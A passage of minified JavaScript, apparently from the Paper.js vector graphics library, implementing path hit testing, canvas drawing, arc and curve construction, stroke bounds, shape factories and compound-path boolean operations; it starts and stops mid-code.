                        c(1, 3) &&
                        ((o = u[1]),
                        (a = o.getPrevious()),
                        (l = o.getNext()),
                        a._handleOut.isZero() && o._handleIn.isZero() && o._handleOut.isZero() && l._handleIn.isZero() && o._point.subtract(a._point).isOrthogonal(l._point.subtract(o._point)))
                            ? ((i = S.Rectangle), (n = new f(p(0, 3), p(0, 1))), (r = u[1]._point.add(u[2]._point).divide(2)))
                            : 8 === u.length && d(0) && d(2) && d(4) && d(6) && c(1, 5) && c(3, 7)
                            ? ((i = S.Rectangle), (s = (n = new f(p(1, 6), p(0, 3))).subtract(new f(p(0, 7), p(1, 2))).divide(2)), (r = u[3]._point.add(u[4]._point).divide(2)))
                            : 4 === u.length && d(0) && d(1) && d(2) && d(3) && (h.isZero(p(0, 2) - p(1, 3)) ? ((i = S.Circle), (s = p(0, 2) / 2)) : ((i = S.Ellipse), (s = new f(p(2, 0) / 2, p(3, 1) / 2))), (r = u[1]._point)),
                        i)
                    ) {
                        var g = this.getPosition(!0),
                            v = new i({ center: g, size: n, radius: s, insert: !1 });
                        return v.copyAttributes(this, !0), v._matrix.prepend(this._matrix), v.rotate(r.subtract(g).getAngle() + 90), (t === e || t) && v.insertAbove(this), v;
                    }
                    return null;
                },
                toPath: "#clone",
                compare: function t(e) {
                    if (!e || e instanceof L) return t.base.call(this, e);
                    var i = this.getCurves(),
                        n = e.getCurves(),
                        s = i.length,
                        r = n.length;
                    if (!s || !r) return s == r;
                    for (var o, a, l = i[0].getValues(), h = [], u = 0, c = 0, d = 0; d < r; d++) {
                        var f = n[d].getValues();
                        if ((h.push(f), (v = M.getOverlaps(l, f)))) {
                            (o = !d && v[0][0] > 0 ? r - 1 : d), (a = v[0][1]);
                            break;
                        }
                    }
                    var p,
                        g = Math.abs;
                    for (f = h[o]; l && f; ) {
                        var v;
                        if ((v = M.getOverlaps(l, f)))
                            if (g(v[0][0] - c) < 1e-8) {
                                1 === (c = v[1][0]) && ((l = ++u < s ? i[u].getValues() : null), (c = 0));
                                var m = v[0][1];
                                if (g(m - a) < 1e-8) {
                                    if ((p || (p = [o, m]), 1 === (a = v[1][1]) && (++o >= r && (o = 0), (f = h[o] || n[o].getValues()), (a = 0)), !l)) return p[0] === o && p[1] === a;
                                    continue;
                                }
                            }
                        break;
                    }
                    return !1;
                },
                _hitTestSelf: function (t, e, i, n) {
                    var s,
                        r,
                        o,
                        a,
                        l,
                        h,
                        u = this,
                        c = this.getStyle(),
                        d = this._segments,
                        f = d.length,
                        p = this._closed,
                        g = e._tolerancePadding,
                        v = g,
                        m = e.stroke && c.hasStroke(),
                        _ = e.fill && c.hasFill(),
                        y = e.curves,
                        w = m ? c.getStrokeWidth() / 2 : (_ && e.tolerance > 0) || y ? 0 : null;
                    function x(e, i) {
                        return t.subtract(e).divide(i).length <= 1;
                    }
                    function b(t, i, n) {
                        if (!e.selected || i.isSelected()) {
                            var s = t._point;
                            if ((i !== s && (i = i.add(s)), x(i, v))) return new I(n, u, { segment: t, point: i });
                        }
                    }
                    function S(t, i) {
                        return ((i || e.segments) && b(t, t._point, "segment")) || (!i && e.handles && (b(t, t._handleIn, "handle-in") || b(t, t._handleOut, "handle-out")));
                    }
                    function C(t) {
                        a.add(t);
                    }
                    function T(e) {
                        var i,
                            l = p || (e._index > 0 && e._index < f - 1);
                        return "round" === (l ? s : r)
                            ? x(e._point, v)
                            : ((a = new E({ internal: !0, closed: !0 })),
                              l ? e.isSmooth() || E._addBevelJoin(e, s, w, o, null, n, C, !0) : "square" === r && E._addSquareCap(e, r, w, null, n, C, !0),
                              a.isEmpty() ? void 0 : a.contains(t) || ((i = a.getNearestLocation(t)) && x(i.getPoint(), g)));
                    }
                    if ((null !== w && (w > 0 ? ((s = c.getStrokeJoin()), (r = c.getStrokeCap()), (o = c.getMiterLimit()), (v = v.add(E._getStrokePadding(w, n)))) : (s = r = "round")), !e.ends || e.segments || p)) {
                        if (e.segments || e.handles) for (var k = 0; k < f; k++) if ((h = S(d[k]))) return h;
                    } else if ((h = S(d[0], !0) || S(d[f - 1], !0))) return h;
                    if (null !== w) {
                        if ((l = this.getNearestLocation(t))) {
                            var O = l.getTime();
                            0 === O || (1 === O && f > 1) ? T(l.getSegment()) || (l = null) : x(l.getPoint(), v) || (l = null);
                        }
                        if (!l && "miter" === s && f > 1)
                            for (k = 0; k < f; k++) {
                                var P = d[k];
                                if (t.getDistance(P._point) <= o * w && T(P)) {
                                    l = P.getLocation();
                                    break;
                                }
                            }
                    }
                    return (!l && _ && this._contains(t)) || (l && !m && !y) ? new I("fill", this) : l ? new I(m ? "stroke" : "curve", this, { location: l, point: l.getPoint() }) : null;
                },
            },
            s.each(
                M._evaluateMethods,
                function (t) {
                    this[t + "At"] = function (e) {
                        var i = this.getLocationAt(e);
                        return i && i[t]();
                    };
                },
                {
                    beans: !1,
                    getLocationOf: function () {
                        for (var t = c.read(arguments), e = this.getCurves(), i = 0, n = e.length; i < n; i++) {
                            var s = e[i].getLocationOf(t);
                            if (s) return s;
                        }
                        return null;
                    },
                    getOffsetOf: function () {
                        var t = this.getLocationOf.apply(this, arguments);
                        return t ? t.getOffset() : null;
                    },
                    getLocationAt: function (t) {
                        if ("number" == typeof t) {
                            for (var e = this.getCurves(), i = 0, n = 0, s = e.length; n < s; n++) {
                                var r = i,
                                    o = e[n];
                                if ((i += o.getLength()) > t) return o.getLocationAt(t - r);
                            }
                            if (e.length > 0 && t <= this.getLength()) return new z(e[e.length - 1], 1);
                        } else if (t && t.getPath && t.getPath() === this) return t;
                        return null;
                    },
                    getOffsetsWithTangent: function () {
                        var t = c.read(arguments);
                        if (t.isZero()) return [];
                        for (var e = [], i = 0, n = this.getCurves(), s = 0, r = n.length; s < r; s++) {
                            for (var o = n[s], a = o.getTimesWithTangent(t), l = 0, h = a.length; l < h; l++) {
                                var u = i + o.getOffsetAtTime(a[l]);
                                e.indexOf(u) < 0 && e.push(u);
                            }
                            i += o.length;
                        }
                        return e;
                    },
                }
            ),
            new (function () {
                function t(t, e, i) {
                    var n,
                        s,
                        r,
                        o,
                        a,
                        l,
                        h,
                        u,
                        c = e._segments,
                        d = c.length,
                        f = new Array(6),
                        p = !0;
                    function g(e) {
                        if (i) e._transformCoordinates(i, f), (n = f[0]), (s = f[1]);
                        else {
                            var c = e._point;
                            (n = c._x), (s = c._y);
                        }
                        if (p) t.moveTo(n, s), (p = !1);
                        else {
                            if (i) (a = f[2]), (l = f[3]);
                            else {
                                var d = e._handleIn;
                                (a = n + d._x), (l = s + d._y);
                            }
                            a === n && l === s && h === r && u === o ? t.lineTo(n, s) : t.bezierCurveTo(h, u, a, l, n, s);
                        }
                        if (((r = n), (o = s), i)) (h = f[4]), (u = f[5]);
                        else {
                            d = e._handleOut;
                            (h = r + d._x), (u = o + d._y);
                        }
                    }
                    for (var v = 0; v < d; v++) g(c[v]);
                    e._closed && d > 0 && g(c[0]);
                }
                return {
                    _draw: function (e, i, n, s) {
                        var r = i.dontStart,
                            o = i.dontFinish || i.clip,
                            a = this.getStyle(),
                            l = a.hasFill(),
                            h = a.hasStroke(),
                            u = a.getDashArray(),
                            c = !st.support.nativeDash && h && u && u.length;
                        function d(t) {
                            return u[((t % c) + c) % c];
                        }
                        if ((r || e.beginPath(), (l || (h && !c) || o) && (t(e, this, s), this._closed && e.closePath()), !o && (l || h) && (this._setStyles(e, i, n), l && (e.fill(a.getFillRule()), (e.shadowColor = "rgba(0,0,0,0)")), h))) {
                            if (c) {
                                r || e.beginPath();
                                var f,
                                    p = new $(this, 0.25, 32, !1, s),
                                    g = p.length,
                                    v = -a.getDashOffset(),
                                    m = 0;
                                for (v %= g; v > 0; ) v -= d(m--) + d(m--);
                                for (; v < g; ) (f = v + d(m++)), (v > 0 || f > 0) && p.drawPart(e, Math.max(v, 0), Math.max(f, 0)), (v = f + d(m++));
                            }
                            e.stroke();
                        }
                    },
                    _drawSelected: function (e, i) {
                        e.beginPath(),
                            t(e, this, i),
                            e.stroke(),
                            (function (t, e, i, n) {
                                var s,
                                    r,
                                    o = n / 2,
                                    a = new Array(6);
                                function l(e) {
                                    var i = a[e],
                                        n = a[e + 1];
                                    (s == i && r == n) || (t.beginPath(), t.moveTo(s, r), t.lineTo(i, n), t.stroke(), t.beginPath(), t.arc(i, n, o, 0, 2 * Math.PI, !0), t.fill());
                                }
                                for (var h = 0, u = e.length; h < u; h++) {
                                    var c = e[h],
                                        d = c._selection;
                                    if ((c._transformCoordinates(i, a), (s = a[0]), (r = a[1]), 2 & d && l(2), 4 & d && l(4), t.fillRect(s - o, r - o, n, n), !(1 & d))) {
                                        var f = t.fillStyle;
                                        (t.fillStyle = "#ffffff"), t.fillRect(s - o + 1, r - o + 1, n - 2, n - 2), (t.fillStyle = f);
                                    }
                                }
                            })(e, this._segments, i, st.settings.handleSize);
                    },
                };
            })(),
            new (function () {
                function t(t) {
                    var e = t._segments;
                    if (!e.length) throw new Error("Use a moveTo() command first");
                    return e[e.length - 1];
                }
                return {
                    moveTo: function () {
                        var t = this._segments;
                        1 === t.length && this.removeSegment(0), t.length || this._add([new O(c.read(arguments))]);
                    },
                    moveBy: function () {
                        throw new Error("moveBy() is unsupported on Path items.");
                    },
                    lineTo: function () {
                        this._add([new O(c.read(arguments))]);
                    },
                    cubicCurveTo: function () {
                        var e = c.read(arguments),
                            i = c.read(arguments),
                            n = c.read(arguments),
                            s = t(this);
                        s.setHandleOut(e.subtract(s._point)), this._add([new O(n, i.subtract(n))]);
                    },
                    quadraticCurveTo: function () {
                        var e = c.read(arguments),
                            i = c.read(arguments),
                            n = t(this)._point;
                        this.cubicCurveTo(e.add(n.subtract(e).multiply(1 / 3)), e.add(i.subtract(e).multiply(1 / 3)), i);
                    },
                    curveTo: function () {
                        var e = c.read(arguments),
                            i = c.read(arguments),
                            n = s.pick(s.read(arguments), 0.5),
                            r = 1 - n,
                            o = t(this)._point,
                            a = e
                                .subtract(o.multiply(r * r))
                                .subtract(i.multiply(n * n))
                                .divide(2 * n * r);
                        if (a.isNaN()) throw new Error("Cannot put a curve through points with parameter = " + n);
                        this.quadraticCurveTo(a, i);
                    },
                    arcTo: function () {
                        var e,
                            i,
                            n,
                            r,
                            o = Math.abs,
                            a = Math.sqrt,
                            l = t(this),
                            u = l._point,
                            d = c.read(arguments),
                            p = s.peek(arguments);
                        if ("boolean" == typeof (x = s.pick(p, !0))) var g = (S = u.add(d).divide(2)).add(S.subtract(u).rotate(x ? -90 : 90));
                        else if (s.remain(arguments) <= 2) (g = d), (d = c.read(arguments));
                        else {
                            var v = f.read(arguments),
                                y = h.isZero;
                            if (y(v.width) || y(v.height)) return this.lineTo(d);
                            var w = s.read(arguments),
                                x = !!s.read(arguments),
                                b = !!s.read(arguments),
                                S = u.add(d).divide(2),
                                C = (U = u.subtract(S).rotate(-w)).x,
                                T = U.y,
                                k = o(v.width),
                                I = o(v.height),
                                P = k * k,
                                M = I * I,
                                z = C * C,
                                A = T * T,
                                E = a(z / P + A / M);
                            if ((E > 1 && ((P = (k *= E) * k), (M = (I *= E) * I)), o((E = (P * M - P * A - M * z) / (P * A + M * z))) < 1e-12 && (E = 0), E < 0)) throw new Error("Cannot create an arc with the given arguments");
                            (e = new c((k * T) / I, (-I * C) / k)
                                .multiply((b === x ? -1 : 1) * a(E))
                                .rotate(w)
                                .add(S)),
                                (i = (n = (r = new m().translate(e).rotate(w).scale(k, I))._inverseTransform(u)).getDirectedAngle(r._inverseTransform(d))),
                                !x && i > 0 ? (i -= 360) : x && i < 0 && (i += 360);
                        }
                        if (g) {
                            var L = new _(u.add(g).divide(2), g.subtract(u).rotate(90), !0),
                                $ = new _(g.add(d).divide(2), d.subtract(g).rotate(90), !0),
                                j = new _(u, d),
                                D = j.getSide(g);
                            if (!(e = L.intersect($, !0))) {
                                if (!D) return this.lineTo(d);
                                throw new Error("Cannot create an arc with the given arguments");
                            }
                            i = (n = u.subtract(e)).getDirectedAngle(d.subtract(e));
                            var N = j.getSide(e, !0);
                            0 === N ? (i = D * o(i)) : D === N && (i += i < 0 ? 360 : -360);
                        }
                        for (var F = o(i), B = F >= 360 ? 4 : Math.ceil((F - 1e-7) / 90), H = i / B, q = (H * Math.PI) / 360, R = ((4 / 3) * Math.sin(q)) / (1 + Math.cos(q)), W = [], V = 0; V <= B; V++) {
                            var U = d,
                                Z = null;
                            if ((V < B && ((Z = n.rotate(90).multiply(R)), r ? ((U = r._transformPoint(n)), (Z = r._transformPoint(n.add(Z)).subtract(U))) : (U = e.add(n))), V)) {
                                var Y = n.rotate(-90).multiply(R);
                                r && (Y = r._transformPoint(n.add(Y)).subtract(U)), W.push(new O(U, Y, Z));
                            } else l.setHandleOut(Z);
                            n = n.rotate(H);
                        }
                        this._add(W);
                    },
                    lineBy: function () {
                        var e = c.read(arguments),
                            i = t(this)._point;
                        this.lineTo(i.add(e));
                    },
                    curveBy: function () {
                        var e = c.read(arguments),
                            i = c.read(arguments),
                            n = s.read(arguments),
                            r = t(this)._point;
                        this.curveTo(r.add(e), r.add(i), n);
                    },
                    cubicCurveBy: function () {
                        var e = c.read(arguments),
                            i = c.read(arguments),
                            n = c.read(arguments),
                            s = t(this)._point;
                        this.cubicCurveTo(s.add(e), s.add(i), s.add(n));
                    },
                    quadraticCurveBy: function () {
                        var e = c.read(arguments),
                            i = c.read(arguments),
                            n = t(this)._point;
                        this.quadraticCurveTo(n.add(e), n.add(i));
                    },
                    arcBy: function () {
                        var e = t(this)._point,
                            i = e.add(c.read(arguments)),
                            n = s.pick(s.peek(arguments), !0);
                        "boolean" == typeof n ? this.arcTo(i, n) : this.arcTo(i, e.add(c.read(arguments)));
                    },
                    closePath: function (t) {
                        this.setClosed(!0), this.join(this, t);
                    },
                };
            })(),
            {
                _getBounds: function (t, e) {
                    var i = e.handle ? "getHandleBounds" : e.stroke ? "getStrokeBounds" : "getBounds";
                    return E[i](this._segments, this._closed, this, t, e);
                },
                statics: {
                    getBounds: function (t, e, i, n, s, r) {
                        var o = t[0];
                        if (!o) return new g();
                        var a = new Array(6),
                            l = o._transformCoordinates(n, new Array(6)),
                            h = l.slice(0, 2),
                            u = h.slice(),
                            c = new Array(2);
                        function d(t) {
                            t._transformCoordinates(n, a);
                            for (var e = 0; e < 2; e++) M._addBounds(l[e], l[e + 4], a[e + 2], a[e], e, r ? r[e] : 0, h, u, c);
                            var i = l;
                            (l = a), (a = i);
                        }
                        for (var f = 1, p = t.length; f < p; f++) d(t[f]);
                        return e && d(o), new g(h[0], h[1], u[0] - h[0], u[1] - h[1]);
                    },
                    getStrokeBounds: function (t, e, i, n, s) {
                        var r = i.getStyle(),
                            o = r.hasStroke(),
                            a = r.getStrokeWidth(),
                            l = o && i._getStrokeMatrix(n, s),
                            h = o && E._getStrokePadding(a, l),
                            u = E.getBounds(t, e, i, n, s, h);
                        if (!o) return u;
                        var c = a / 2,
                            d = r.getStrokeJoin(),
                            p = r.getStrokeCap(),
                            v = r.getMiterLimit(),
                            m = new g(new f(h));
                        function _(t) {
                            u = u.include(t);
                        }
                        function y(t) {
                            u = u.unite(m.setCenter(t._point.transform(n)));
                        }
                        function w(t, e) {
                            "round" === e || t.isSmooth() ? y(t) : E._addBevelJoin(t, e, c, v, n, l, _);
                        }
                        function x(t, e) {
                            "round" === e ? y(t) : E._addSquareCap(t, e, c, n, l, _);
                        }
                        for (var b = t.length - (e ? 0 : 1), S = 1; S < b; S++) w(t[S], d);
                        return e ? w(t[0], d) : b > 0 && (x(t[0], p), x(t[t.length - 1], p)), u;
                    },
                    _getStrokePadding: function (t, e) {
                        if (!e) return [t, t];
                        var i = new c(t, 0).transform(e),
                            n = new c(0, t).transform(e),
                            s = i.getAngleInRadians(),
                            r = i.getLength(),
                            o = n.getLength(),
                            a = Math.sin(s),
                            l = Math.cos(s),
                            h = Math.tan(s),
                            u = Math.atan2(o * h, r),
                            d = Math.atan2(o, h * r);
                        return [Math.abs(r * Math.cos(u) * l + o * Math.sin(u) * a), Math.abs(o * Math.sin(d) * l + r * Math.cos(d) * a)];
                    },
                    _addBevelJoin: function (t, e, i, n, s, r, o, a) {
                        var l = t.getCurve(),
                            h = l.getPrevious(),
                            u = l.getPoint1().transform(s),
                            d = h.getNormalAtTime(1).multiply(i).transform(r),
                            f = l.getNormalAtTime(0).multiply(i).transform(r);
                        if ((d.getDirectedAngle(f) < 0 && ((d = d.negate()), (f = f.negate())), a && o(u), o(u.add(d)), "miter" === e)) {
                            var p = new _(u.add(d), new c(-d.y, d.x), !0).intersect(new _(u.add(f), new c(-f.y, f.x), !0), !0);
                            p && u.getDistance(p) <= n * i && o(p);
                        }
                        o(u.add(f));
                    },
                    _addSquareCap: function (t, e, i, n, s, r, o) {
                        var a = t._point.transform(n),
                            l = t.getLocation(),
                            h = l
                                .getNormal()
                                .multiply(0 === l.getTime() ? i : -i)
                                .transform(s);
                        "square" === e && (o && (r(a.subtract(h)), r(a.add(h))), (a = a.add(h.rotate(-90)))), r(a.add(h)), r(a.subtract(h));
                    },
                    getHandleBounds: function (t, e, i, n, s) {
                        var r,
                            o,
                            a = i.getStyle();
                        if (s.stroke && a.hasStroke()) {
                            var l = i._getStrokeMatrix(n, s),
                                h = a.getStrokeWidth() / 2,
                                u = h;
                            "miter" === a.getStrokeJoin() && (u = h * a.getMiterLimit()), "square" === a.getStrokeCap() && (u = Math.max(u, h * Math.SQRT2)), (r = E._getStrokePadding(h, l)), (o = E._getStrokePadding(u, l));
                        }
                        for (var c = new Array(6), d = 1 / 0, f = -d, p = d, v = f, m = 0, _ = t.length; m < _; m++) {
                            t[m]._transformCoordinates(n, c);
                            for (var y = 0; y < 6; y += 2) {
                                var w = y ? r : o,
                                    x = w ? w[0] : 0,
                                    b = w ? w[1] : 0,
                                    S = c[y],
                                    C = c[y + 1],
                                    T = S - x,
                                    k = S + x,
                                    I = C - b,
                                    O = C + b;
                                T < d && (d = T), k > f && (f = k), I < p && (p = I), O > v && (v = O);
                            }
                        }
                        return new g(d, p, f - d, v - p);
                    },
                },
            }
        );
    E.inject({
        statics: new (function () {
            var t = 0.5522847498307936,
                e = [new O([-1, 0], [0, t], [0, -t]), new O([0, -1], [-t, 0], [t, 0]), new O([1, 0], [0, -t], [0, t]), new O([0, 1], [t, 0], [-t, 0])];
            function i(t, e, i) {
                var n = s.getNamed(i),
                    r = new E(n && 0 == n.insert && w.NO_INSERT);
                return r._add(t), (r._closed = e), r.set(n, { insert: !0 });
            }
            function n(t, n, s) {
                for (var r = new Array(4), o = 0; o < 4; o++) {
                    var a = e[o];
                    r[o] = new O(a._point.multiply(n).add(t), a._handleIn.multiply(n), a._handleOut.multiply(n));
                }
                return i(r, !0, s);
            }
            return {
                Line: function () {
                    return i([new O(c.readNamed(arguments, "from")), new O(c.readNamed(arguments, "to"))], !1, arguments);
                },
                Circle: function () {
                    var t = c.readNamed(arguments, "center"),
                        e = s.readNamed(arguments, "radius");
                    return n(t, new f(e), arguments);
                },
                Rectangle: function () {
                    var e,
                        n = g.readNamed(arguments, "rectangle"),
                        s = f.readNamed(arguments, "radius", 0, { readNull: !0 }),
                        r = n.getBottomLeft(!0),
                        o = n.getTopLeft(!0),
                        a = n.getTopRight(!0),
                        l = n.getBottomRight(!0);
                    if (!s || s.isZero()) e = [new O(r), new O(o), new O(a), new O(l)];
                    else {
                        var h = (s = f.min(s, n.getSize(!0).divide(2))).width,
                            u = s.height,
                            c = h * t,
                            d = u * t;
                        e = [
                            new O(r.add(h, 0), null, [-c, 0]),
                            new O(r.subtract(0, u), [0, d]),
                            new O(o.add(0, u), null, [0, -d]),
                            new O(o.add(h, 0), [-c, 0], null),
                            new O(a.subtract(h, 0), null, [c, 0]),
                            new O(a.add(0, u), [0, -d], null),
                            new O(l.subtract(0, u), null, [0, d]),
                            new O(l.subtract(h, 0), [c, 0]),
                        ];
                    }
                    return i(e, !0, arguments);
                },
                RoundRectangle: "#Rectangle",
                Ellipse: function () {
                    var t = S._readEllipse(arguments);
                    return n(t.center, t.radius, arguments);
                },
                Oval: "#Ellipse",
                Arc: function () {
                    var t = c.readNamed(arguments, "from"),
                        e = c.readNamed(arguments, "through"),
                        i = c.readNamed(arguments, "to"),
                        n = s.getNamed(arguments),
                        r = new E(n && 0 == n.insert && w.NO_INSERT);
                    return r.moveTo(t), r.arcTo(e, i), r.set(n);
                },
                RegularPolygon: function () {
                    for (
                        var t = c.readNamed(arguments, "center"), e = s.readNamed(arguments, "sides"), n = s.readNamed(arguments, "radius"), r = 360 / e, o = e % 3 == 0, a = new c(0, o ? -n : n), l = o ? -1 : 0.5, h = new Array(e), u = 0;
                        u < e;
                        u++
                    )
                        h[u] = new O(t.add(a.rotate((u + l) * r)));
                    return i(h, !0, arguments);
                },
                Star: function () {
                    for (
                        var t = c.readNamed(arguments, "center"),
                            e = 2 * s.readNamed(arguments, "points"),
                            n = s.readNamed(arguments, "radius1"),
                            r = s.readNamed(arguments, "radius2"),
                            o = 360 / e,
                            a = new c(0, -1),
                            l = new Array(e),
                            h = 0;
                        h < e;
                        h++
                    )
                        l[h] = new O(t.add(a.rotate(o * h).multiply(h % 2 ? r : n)));
                    return i(l, !0, arguments);
                },
            };
        })(),
    });
    var L = A.extend(
        {
            _class: "CompoundPath",
            _serializeFields: { children: [] },
            beans: !0,
            initialize: function (t) {
                (this._children = []), (this._namedChildren = {}), this._initialize(t) || ("string" == typeof t ? this.setPathData(t) : this.addChildren(Array.isArray(t) ? t : arguments));
            },
            insertChildren: function t(e, i) {
                var n = i,
                    r = n[0];
                r && "number" == typeof r[0] && (n = [n]);
                for (var o = i.length - 1; o >= 0; o--) {
                    var a = n[o];
                    n !== i || a instanceof E || (n = s.slice(n)), Array.isArray(a) ? (n[o] = new E({ segments: a, insert: !1 })) : a instanceof L && (n.splice.apply(n, [o, 1].concat(a.removeChildren())), a.remove());
                }
                return t.base.call(this, e, n);
            },
            reduce: function t(e) {
                for (var i = this._children, n = i.length - 1; n >= 0; n--) {
                    var s;
                    (s = i[n].reduce(e)).isEmpty() && s.remove();
                }
                return i.length ? t.base.call(this) : ((s = new E(w.NO_INSERT)).copyAttributes(this), s.insertAbove(this), this.remove(), s);
            },
            isClosed: function () {
                for (var t = this._children, e = 0, i = t.length; e < i; e++) if (!t[e]._closed) return !1;
                return !0;
            },
            setClosed: function (t) {
                for (var e = this._children, i = 0, n = e.length; i < n; i++) e[i].setClosed(t);
            },
            getFirstSegment: function () {
                var t = this.getFirstChild();
                return t && t.getFirstSegment();
            },
            getLastSegment: function () {
                var t = this.getLastChild();
                return t && t.getLastSegment();
            },
            getCurves: function () {
                for (var t = this._children, e = [], i = 0, n = t.length; i < n; i++) s.push(e, t[i].getCurves());
                return e;
            },
            getFirstCurve: function () {
                var t = this.getFirstChild();
                return t && t.getFirstCurve();
            },
            getLastCurve: function () {
                var t = this.getLastChild();
                return t && t.getLastCurve();
            },
            getArea: function () {
                for (var t = this._children, e = 0, i = 0, n = t.length; i < n; i++) e += t[i].getArea();
                return e;
            },
            getLength: function () {
                for (var t = this._children, e = 0, i = 0, n = t.length; i < n; i++) e += t[i].getLength();
                return e;
            },
            getPathData: function (t, e) {
                for (var i = this._children, n = [], s = 0, r = i.length; s < r; s++) {
                    var o = i[s],
                        a = o._matrix;
                    n.push(o.getPathData(t && !a.isIdentity() ? t.appended(a) : t, e));
                }
                return n.join("");
            },
            _hitTestChildren: function t(e, i, n) {
                return t.base.call(this, e, i.class === E || "path" === i.type ? i : s.set({}, i, { fill: !1 }), n);
            },
            _draw: function (t, e, i, n) {
                var s = this._children;
                if (s.length) {
                    (e = e.extend({ dontStart: !0, dontFinish: !0 })), t.beginPath();
                    for (var r = 0, o = s.length; r < o; r++) s[r].draw(t, e, n);
                    if (!e.clip) {
                        this._setStyles(t, e, i);
                        var a = this._style;
                        a.hasFill() && (t.fill(a.getFillRule()), (t.shadowColor = "rgba(0,0,0,0)")), a.hasStroke() && t.stroke();
                    }
                }
            },
            _drawSelected: function (t, e, i) {
                for (var n = this._children, s = 0, r = n.length; s < r; s++) {
                    var o = n[s],
                        a = o._matrix;
                    i[o._id] || o._drawSelected(t, a.isIdentity() ? e : e.appended(a));
                }
            },
        },
        new (function () {
            function t(t, e) {
                var i = t._children;
                if (e && !i.length) throw new Error("Use a moveTo() command first");
                return i[i.length - 1];
            }
            return s.each(
                ["lineTo", "cubicCurveTo", "quadraticCurveTo", "curveTo", "arcTo", "lineBy", "cubicCurveBy", "quadraticCurveBy", "curveBy", "arcBy"],
                function (e) {
                    this[e] = function () {
                        var i = t(this, !0);
                        i[e].apply(i, arguments);
                    };
                },
                {
                    moveTo: function () {
                        var e = t(this),
                            i = e && e.isEmpty() ? e : new E(w.NO_INSERT);
                        i !== e && this.addChild(i), i.moveTo.apply(i, arguments);
                    },
                    moveBy: function () {
                        var e = t(this, !0),
                            i = e && e.getLastSegment(),
                            n = c.read(arguments);
                        this.moveTo(i ? n.add(i._point) : n);
                    },
                    closePath: function (e) {
                        t(this, !0).closePath(e);
                    },
                }
            );
        })(),
        s.each(
            ["reverse", "flatten", "simplify", "smooth"],
            function (t) {
                this[t] = function (e) {
                    for (var i, n = this._children, s = 0, r = n.length; s < r; s++) i = n[s][t](e) || i;
                    return i;
                };
            },
            {}
        )
    );
    A.inject(
        new (function () {
            var t = Math.min,
                i = Math.max,
                n = Math.abs,
                r = { unite: { 1: !0, 2: !0 }, intersect: { 2: !0 }, subtract: { 1: !0 }, exclude: { 1: !0, "-1": !0 } };
            function o(t, e) {
                var i = t.clone(!1).reduce({ simplify: !0 }).transform(null, !0, !0);
                return e ? i.resolveCrossings().reorient("nonzero" === i.getFillRule(), !0) : i;
            }
            function a(t, e, i, n, s) {
                var r = new L(w.NO_INSERT);
                return r.addChildren(t, !0), (r = r.reduce({ simplify: e })), (s && 0 == s.insert) || r.insertAbove(n && i.isSibling(n) && i.getIndex() < n.getIndex() ? n : i), r.copyAttributes(i, !0), r;
            }
            function l(t, e, i, n) {
                if (n && (0 == n.trace || n.stroke) && /^(subtract|intersect)$/.test(i)) return u(t, e, i);
                var l = o(t, !0),
                    h = e && t !== e && o(e, !0),
                    c = r[i];
                (c[i] = !0), h && (c.subtract || c.exclude) ^ h.isClockwise() ^ l.isClockwise() && h.reverse();
                var d,
                    g = p(z.expand(l.getCrossings(h))),
                    _ = l._children || [l],
                    y = h && (h._children || [h]),
                    w = [],
                    x = [];
                function b(t) {
                    for (var e = 0, i = t.length; e < i; e++) {
                        var n = t[e];
                        s.push(w, n._segments), s.push(x, n.getCurves()), (n._overlapsOnly = !0);
                    }
                }
                if (g.length) {
                    b(_), y && b(y);
                    for (var S = 0, C = g.length; S < C; S++) v(g[S]._segment, l, h, x, c);
                    for (S = 0, C = w.length; S < C; S++) {
                        var T = w[S],
                            k = T._intersection;
                        T._winding || v(T, l, h, x, c), (k && k._overlap) || (T._path._overlapsOnly = !1);
                    }
                    d = m(w, c);
                } else
                    d = f(y ? _.concat(y) : _.slice(), function (t) {
                        return !!c[t];
                    });
                return a(d, !0, t, e, n);
            }
            function u(t, e, i) {
                var n = o(t),
                    s = o(e),
                    r = n.getCrossings(s),
                    l = "subtract" === i,
                    h = "divide" === i,
                    u = {},
                    c = [];
                function d(t) {
                    if (!u[t._id] && (h || s.contains(t.getPointAt(t.getLength() / 2)) ^ l)) return c.unshift(t), (u[t._id] = !0);
                }
                for (var f = r.length - 1; f >= 0; f--) {
                    var p = r[f].split();
                    p && (d(p) && p.getFirstSegment().setHandleIn(0, 0), n.getLastSegment().setHandleOut(0, 0));
                }
                return d(n), a(c, !1, t, e);
            }
            function c(t, e) {
                for (var i = t; i; ) {
                    if (i === e) return;
                    i = i._previous;
                }
                for (; t._next && t._next !== e; ) t = t._next;
                if (!t._next) {
                    for (; e._previous; ) e = e._previous;
                    (t._next = e), (e._previous = t);
                }
            }
            function d(t) {
                for (var e = t.length - 1; e >= 0; e--) t[e].clearHandles();
            }
            function f(t, e, i) {
                var r = t && t.length;
                if (r) {
                    var o = s.each(
                            t,
                            function (t, e) {
                                this[t._id] = { container: null, winding: t.isClockwise() ? 1 : -1, index: e };
                            },
                            {}
                        ),
                        a = t.slice().sort(function (t, e) {
                            return n(e.getArea()) - n(t.getArea());
                        }),
                        l = a[0];
                    null == i && (i = l.isClockwise());
                    for (var h = 0; h < r; h++) {
                        for (var u = a[h], c = o[u._id], d = u.getInteriorPoint(), f = 0, p = h - 1; p >= 0; p--) {
                            var g = a[p];
                            if (g.contains(d)) {
                                var v = o[g._id];
                                (f = v.winding), (c.winding += f), (c.container = v.exclude ? v.container : g);
                                break;
                            }
                        }
                        if (e(c.winding) === e(f)) (c.exclude = !0), (t[c.index] = null);
                        else {
                            var m = c.container;
                            u.setClockwise(m ? !m.isClockwise() : i);
                        }
                    }
                }
                return t;
            }
            function p(t, e, i) {
                var n,
                    s,
                    r,
                    o = e && [],
                    a = !1,
                    l = i || [],
                    h = i && {};
                function u(t) {
                    return t._path._id + "." + t._segment1._index;
                }
                for (var f = (i && i.length) - 1; f >= 0; f--) {
                    (p = i[f])._path && (h[u(p)] = !0);
                }
                for (f = t.length - 1; f >= 0; f--) {
                    var p,
                        g,
                        v = t[f],
                        m = v._time,
                        _ = m,
                        y = e && !e(v);
                    if (((p = v._curve) && (p !== s ? ((a = !p.hasHandles() || (h && h[u(p)])), (n = []), (r = null), (s = p)) : r >= 1e-8 && (m /= r)), y)) n && n.push(v);
                    else {
                        if ((e && o.unshift(v), (r = _), m < 1e-8)) g = p._segment1;
                        else if (m > 1 - 1e-8) g = p._segment2;
                        else {
                            var w = p.divideAtTime(m, !0);
                            a && l.push(p, w), (g = w._segment1);
                            for (var x = n.length - 1; x >= 0; x--) {
                                var b = n[x];
